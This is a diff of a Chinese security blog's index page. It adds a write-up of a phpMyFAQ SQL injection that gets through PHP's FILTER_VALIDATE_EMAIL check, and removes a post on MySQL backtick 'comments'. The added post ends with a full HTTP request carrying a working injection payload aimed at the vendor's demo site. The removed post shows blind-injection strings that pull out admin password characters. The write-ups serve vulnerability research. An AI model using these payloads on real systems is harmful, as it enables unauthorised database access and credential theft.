@@ -63,6 +63,96 @@
 
   
     
+    <h3 class="article-title"><a href="/2018/12/06/PHPMyFAQ-SQL-Injection-With-FILTER-VALIDATE-EMAIL/"><span>PHPMyFAQ-SQL-Injection-With-FILTER_VALIDATE_EMAIL</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/12/06/PHPMyFAQ-SQL-Injection-With-FILTER-VALIDATE-EMAIL/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-12-06T09:45:38.000Z">
+          2018-12-06
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>去年遇到一套这个程序而挖的, 主要也就是因为开发者过于的相信PHP自带的FILTER_VALIDATE_EMAIL邮箱验证。<br>在使用了filter_var($email,FILTER_VALIDATE_EMAIL);<br>验证邮箱后, 没有进一步做处理 直接格式化字符串进了sql语句导致了注入。</p>
+<h2 id="FILTER-VALIDATE-EMAIL"><a href="#FILTER-VALIDATE-EMAIL" class="headerlink" title="FILTER_VALIDATE_EMAIL"></a>FILTER_VALIDATE_EMAIL</h2><p>本地调试版本: PHP5.4.5<br>首先来看看PHP的filter_var($email,FILTER_VALIDATE_EMAIL);是如何来验证邮箱是否合法的。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/php-src/php/blob/2b86a89193c151b5e9b098cc9aa8411abd7f30ea/ext/filter/filter.c">https://github.com/php-src/php/blob/2b86a89193c151b5e9b098cc9aa8411abd7f30ea/ext/filter/filter.c</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(filter_var)</span><br><span class="line">&#123;</span><br><span class="line">	zend_long filter = FILTER_DEFAULT;</span><br><span class="line">	zval *filter_args = <span class="literal">NULL</span>, *data;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;z/|lz&quot;</span>, &amp;data, &amp;filter, &amp;filter_args) == FAILURE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!PHP_FILTER_ID_EXISTS(filter)) &#123;</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ZVAL_DUP(return_value, data);</span><br><span class="line"></span><br><span class="line">	php_filter_call(return_value, filter, filter_args, <span class="number">1</span>, FILTER_REQUIRE_SCALAR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>php_filter_call里调用php_zval_filter,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">php_filter_call</span><span class="params">(zval *filtered, zend_long filter, zval *filter_args, <span class="keyword">const</span> <span class="keyword">int</span> copy, zend_long filter_flags)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;       ...</span><br><span class="line">    php_zval_filter(filtered, filter, filter_flags, options,    charset, copy);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">php_zval_filter</span><span class="params">(zval *value, zend_long filter, zend_long flags, zval *options, <span class="keyword">char</span>* charset, zend_bool copy)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	filter_list_entry  filter_func;</span><br><span class="line"></span><br><span class="line">	filter_func = php_find_filter(filter);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!filter_func.id) &#123;</span><br><span class="line">		<span class="comment">/* Find default filter */</span></span><br><span class="line">		filter_func = php_find_filter(FILTER_DEFAULT);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy) &#123;</span><br><span class="line">		SEPARATE_ZVAL(value);</span><br><span class="line">	&#125;</span><br><span class="line">   ......</span><br><span class="line">	convert_to_string(value);</span><br><span class="line"></span><br><span class="line">	filter_func.function(value, flags, options, charset);</span><br></pre></td></tr></table></figure>
+
+<p>根据id, 查找到filter_func, 然后调用指定的方法。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/email1.jpg" alt="-w495"></p>
+<p>filter_var第二个参数为FILTER_VALIDATE_EMAIL时, 调用的是  php_filter_validate_email方法。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/php-src/php/blob/PHP-5.4.5/ext/filter/logical_filters.c">https://github.com/php-src/php/blob/PHP-5.4.5/ext/filter/logical_filters.c</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">php_filter_validate_email</span><span class="params">(PHP_INPUT_FILTER_PARAM_DECL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> regexp[] = <span class="string">&quot;/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?))&#123;255,&#125;)(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?))&#123;65,&#125;@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]&#123;64,&#125;)(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.)&#123;1,126&#125;)&#123;1,&#125;(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)|(?:(?!(?:.*[a-f0-9][:\\]])&#123;7,&#125;)(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,5&#125;)?::(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,5&#125;)?)))|(?:(?:IPv6:(?:(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;5&#125;:)|(?:(?!(?:.*[a-f0-9]:)&#123;5,&#125;)(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,3&#125;)?::(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,3&#125;:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]&#123;2&#125;)|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]&#123;2&#125;)|(?:[1-9]?[0-9])))&#123;3&#125;))\\]))$/iD&quot;</span>;</span><br><span class="line"></span><br><span class="line">	pcre       *re = <span class="literal">NULL</span>;</span><br><span class="line">	pcre_extra *pcre_extra = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> preg_options = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span>         ovector[<span class="number">150</span>]; <span class="comment">/* Needs to be a multiple of 3 */</span></span><br><span class="line">	<span class="keyword">int</span>         matches;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The maximum length of an e-mail address is 320 octets, per RFC 2821. */</span></span><br><span class="line">	<span class="keyword">if</span> (Z_STRLEN_P(value) &gt; <span class="number">320</span>) &#123;</span><br><span class="line">		RETURN_VALIDATION_FAILED</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	re = pcre_get_compiled_regex((<span class="keyword">char</span> *)regexp, &amp;pcre_extra, &amp;preg_options TSRMLS_CC);</span><br><span class="line">	<span class="keyword">if</span> (!re) &#123;</span><br><span class="line">		RETURN_VALIDATION_FAILED</span><br><span class="line">	&#125;</span><br><span class="line">	matches = pcre_exec(re, <span class="literal">NULL</span>, Z_STRVAL_P(value), Z_STRLEN_P(value), <span class="number">0</span>, <span class="number">0</span>, ovector, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 0 means that the vector is too small to hold all the captured substring offsets */</span></span><br><span class="line">	<span class="keyword">if</span> (matches &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		RETURN_VALIDATION_FAILED</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>去年提交这个漏洞的时候, 一直不知道怎么才能插入括号,  那时候用的双参数拼接的方法注入。<br>不过看这正则可以发现,<br>如果email的local part不以双引号开头和结尾, 允许的字符为<br>\x21\x23-\x27\x2A\x2B\x2D\x2F-\x39\x3D\x3F\x5E-\x7E<br>如果以双引号开头和结尾, 允许的字符为<br>\x01-\x08\x0B\x0C\x0E-\x1F\x21\x23-\x5B\x5D-\x7F<br>且如果前面的字符为\x5c, 后面紧跟的字符允许范围为 \x00-\x7F。</p>
+<p>在local part以双引号开头和结尾这种情况中, 括号\x28 \x29在允许的字符范围内, 所以可以把括号写到双引号中。<br>虽然php_filter_validate_email允许邮箱最长为320个字符, 但是local part被正则限制到最多64个字符。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>(直接复制当初的邮件了~~~)</p>
+<p>In the latest version of phpMyFAQ, there is a SQL Injection vulnerability in ajaxservice.php.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;savecomment&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$faqConfig-&gt;get(<span class="string">&#x27;records.allowCommentsForGuests&#x27;</span>) &amp;&amp; !$user-&gt;perm-&gt;checkRight($user-&gt;getUserId(), <span class="string">&#x27;addcomment&#x27;</span>)) &#123; </span><br><span class="line">    $message = <span class="keyword">array</span>(<span class="string">&#x27;error&#x27;</span> =&gt; $PMF_LANG[<span class="string">&#x27;err_NotAuth&#x27;</span>]);</span><br><span class="line">    <span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$faq = <span class="keyword">new</span> PMF_Faq($faqConfig); </span><br><span class="line">$oComment = <span class="keyword">new</span> PMF_Comment($faqConfig); </span><br><span class="line">$category = <span class="keyword">new</span> PMF_Category($faqConfig); </span><br><span class="line">$type = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;type&#x27;</span>, FILTER_SANITIZE_STRING); </span><br><span class="line">$faqid = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;id&#x27;</span>, FILTER_VALIDATE_INT, <span class="number">0</span>); </span><br><span class="line">$newsid = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;newsid&#x27;</span>, FILTER_VALIDATE_INT); </span><br><span class="line">$username = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;user&#x27;</span>, FILTER_SANITIZE_STRING); </span><br><span class="line">$mail = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;mail&#x27;</span>, FILTER_VALIDATE_EMAIL); </span><br><span class="line">$comment = PMF_Filter::filterInput(INPUT_POST, <span class="string">&#x27;comment_text&#x27;</span>, FILTER_SANITIZE_SPECIAL_CHARS);</span><br></pre></td></tr></table></figure>
+
+<p>The email variable uses FILTER_VALIDATE_EMAIL to validate, but FILTER_VALIDATE_EMAIL ﬁlter cannot completely prevent SQL Injection. With this ﬁlter, single quotes and some special characters can still be used, that’s enough for SQL Injection.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$commentData = [ </span><br><span class="line">    <span class="string">&#x27;record_id&#x27;</span> =&gt; $id, </span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; $type, </span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; $username, </span><br><span class="line">    <span class="string">&#x27;usermail&#x27;</span> =&gt; $mail, </span><br><span class="line">    <span class="string">&#x27;comment&#x27;</span> =&gt; nl2br($comment), </span><br><span class="line">    <span class="string">&#x27;date&#x27;</span> =&gt; $_SERVER[<span class="string">&#x27;REQUEST_TIME&#x27;</span>], </span><br><span class="line">    <span class="string">&#x27;helped&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure>
+
+<p>The mail variable is loaded into the commentData variable,</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$oComment-&gt;addComment($commentData)</span><br></pre></td></tr></table></figure>
+
+<p>and the commentData variable is inserted into the database directly, thus leads to SQL Injection vulnerability.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addComment</span>(<span class="params"><span class="keyword">Array</span> $commentData</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $query = sprintf(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    INSERT INTO </span></span><br><span class="line"><span class="string">        %sfaqcomments </span></span><br><span class="line"><span class="string">    VALUES </span></span><br><span class="line"><span class="string">        (%d, %d, &#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;, %d,&#x27;%s&#x27;)&quot;</span>,</span><br><span class="line">    PMF_Db::getTablePrefix(), <span class="keyword">$this</span>-&gt;config-&gt;getDb()-&gt;nextId(PMF_Db::getTablePrefix().<span class="string">&#x27;faqcom ments&#x27;</span>,<span class="string">&#x27;id_comment&#x27;</span>), </span><br><span class="line">    $commentData[<span class="string">&#x27;record_id&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;type&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;usermail&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;comment&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;date&#x27;</span>], </span><br><span class="line">    $commentData[<span class="string">&#x27;helped&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;config-&gt;getDb()-&gt;query($query)) &#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>test the phpMyFAQ demo.</p>
+<p>Firstly, add a question and got the question id.<br><a target="_blank" rel="noopener" href="http://denholm.demo.phpmyfaq.de/index.php?sid=620&amp;lang=zh&amp;action=add&amp;cat=2">http://denholm.demo.phpmyfaq.de/index.php?sid=620&amp;lang=zh&amp;action=add&amp;cat=2</a></p>
+<p>Secondly ,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;ajaxservice.php?action&#x3D;savecomment HTTP&#x2F;1.1 </span><br><span class="line">Host: denholm.demo.phpmyfaq.de </span><br><span class="line">Proxy-Connection: keep-alive </span><br><span class="line">Content-Length: 135 </span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01 Origin: http:&#x2F;&#x2F;denholm.demo.phpmyfaq.de </span><br><span class="line">X-Requested-With: XMLHttpRequest </span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit &#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;59.0.3071.115 Safari&#x2F;537.36 </span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8 </span><br><span class="line">Referer: http:&#x2F;&#x2F;denholm.demo.phpmyfaq.de&#x2F;index.php?action&#x3D;artikel&amp;cat&#x3D;1&amp;id&#x3D;2&amp;artlang&#x3D;zh </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en;q&#x3D;0.6,it;q&#x3D;0.4</span><br><span class="line"></span><br><span class="line">id&#x3D;5&amp;lang&#x3D;zh&amp;type&#x3D;faq&amp;user&#x3D;xiaoyu111&amp;mail&#x3D;xiaoyu1~&#39;&#x2F;*11~%40qq.com&amp;comment_text&#x3D;*&#x2F;,(select user()),1500351093,null)#&amp;captcha&#x3D;OMSNS9</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/email2.jpg" alt="-w878"></p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>1.<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc3696#section-3">https://tools.ietf.org/html/rfc3696#section-3</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/"><span>JNDI-Injection-Via-LDAP-Deserialize</span></a></h3>
     
   
@@ -887,102 +977,6 @@ echo mysql_error();</code></pre>
     var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
     echo mysql_error();</code></pre>
 <p><img src="http://onw16foqc.bkt.clouddn.com/14923497093942.jpg"></p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/Web/">Web</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2017/04/11/为什么-backtick-能做注释符/"><span>为什么`(backtick)能做&amp;quot;注释符&amp;quot;</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2017/04/11/为什么-backtick-能做注释符/" rel="bookmark">
-        <time class="entry-date published" datetime="2017-04-11T07:43:37.000Z">
-          2017-04-11
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <pre><code>文章用markdown写的,用`的时候老是成了代码块,找了会资料都没转义掉,以下用backtick代替`。</code></pre>
-<p>很久以前的一个Paper,介绍了mysql下的注释符,里面包含了两种不常见的&quot;注释符&quot;。<br><img src="http://onw16foqc.bkt.clouddn.com/14918862570531.jpg"></p>
-<p>今天有小伙伴刚好来问了一下我, 为啥backtick做注释符时,并不是通用的, 也就是有时候并不能注释掉,不能像#这种注释符通用。<br>(其实paper里的NOTE已经基本解答了这个问题,不过NOTE写的是只能用在别名处)</p>
-<blockquote>
-<p>Note:</p>
-</blockquote>
-<p>The backtick can only be used to end a query when used as an alias.</p>
-<p>他给我的语句类似于</p>
-<pre><code>select * from qs_members where username = &#39;x&#39; and password = &#39;x&#39;;
-
-然后他盲注,插入payload
-1&#39; and if(substr((select password from qs_admin limit 1),1,1)=&#39;a&#39;,sleep(1),1)` 语句就成了
-
-select * from qs_members where username=&#39;1&#39;and if(substr((select password from qs_admin limit 1),1,1)=&#39;a&#39;,sleep(1),1)` and password=&#39;admin&#39;;</code></pre>
-<p>然后这时候语句就开始报错了, 但是如果把backtick换成#,语句就能正常执行, 说明这个时候backtick没有了注释效果。</p>
-<p>首先来看一下mysql手册的comment Syntax</p>
-<blockquote>
-<p>From a # character to the end of the line.</p>
-</blockquote>
-<p>From a –  sequence to the end of the line. In MySQL, the –  (double-dash) comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on). This syntax differs slightly from standard SQL comment syntax, as discussed in Section 1.8.2.4, “&apos;–&apos; as the Start of a Comment”.</p>
-<blockquote>
-<p>From a /* sequence to the following */ sequence, as in the C programming language. This syntax enables a comment to extend over multiple lines because the beginning and closing sequences need not be on the same line.</p>
-</blockquote>
-<p>官方所介绍的注释只有前三种, backtick并不是一个真正的注释符, 而是一个identifier quote。</p>
-<blockquote>
-<p>Backticks for enclosing identifiers such as table and column names,<br>Backticks are generally used to indicate an identifier and as well be safe from accidentally using the Reserved Keywords.</p>
-</blockquote>
-<p>一般用来引住表名,列名,别名。</p>
-<p>那为什么backtick 能当作&quot;注释符&quot;呢,<br>其实这是因为, 在mysql query 执行sql的时候, 不知道啥原因(翻了会google也没找到具体的解,感觉还是最后的时候mysql给它给闭合了?) backtick在不闭合的情况下, 也能够正常执行。<br><img src="http://onw16foqc.bkt.clouddn.com/14918948815701.jpg"></p>
-<p>别名、表名、列名在backtick的引用下,可以写任意字符。<br>所以</p>
-<pre><code>select username from qs_members where username = &#39;&#39; and password = &#39;&#39;;
-我们在username处插入yu&#39; union select 1 from qs_admin `
-语句就成了
-select username from qs_members where username = &#39;yu&#39; union select 1 from qs_admin `&#39; and password = &#39;&#39;</code></pre>
-<p>给起别名的时候,as是可以省略的,<br>所以后面的&apos; and password = &apos;&apos; 这些字符都成了qs_admin表的别名,<br>也就相当于成了一个&quot;注释符&quot;,让后面的内容不再有以前的效果。</p>
-<p>那为什么有时候backtick 又不能当做注释符呢?<br>select * from qs_members where username=&apos;1&apos; and if(substr((select password from qs_admin limit 1),1,1)=&apos;a&apos;,sleep(1),1)` and password=&apos;admin&apos;;<br>像上面我小伙伴失败的那个语句, 很明显backtick在的这个地方, 是一个不允许起别名的地方,所以语句就报错了。<br>还有一种失败的情况是,</p>
-<pre><code>当sql语句为 select * from xxx where `username` = &#39;a&#39; union select 1,2` and `password`=&#39;xxxx&#39;
-很多查询会把column用`给引住, 在这种情况下, `也不能当作注释符, 因为我们插的` 和后面一个列的` 所闭合, 导致了没办法当作注释。</code></pre>
-<p>所以呢,backtick要起一个注释效果, 是需要在允许写表名、列名、别名的地方。</p>
-<p>那么盲注、报错之类不用union的注入, 如何使用backtick 来注释呢。<br>方法很多, 比如可以找一个可以用列名的地方, 例如 order by,having 之类的。</p>
-<p><img src="http://onw16foqc.bkt.clouddn.com/14918960157153.jpg"></p>
-<p>盲注的话, 会提示找不到这个column<br><img src="http://onw16foqc.bkt.clouddn.com/14918960579734.jpg"></p>
-<p>加个@即可</p>
-<p><img src="http://onw16foqc.bkt.clouddn.com/14918961357392.jpg"></p>
 
       
     </div>
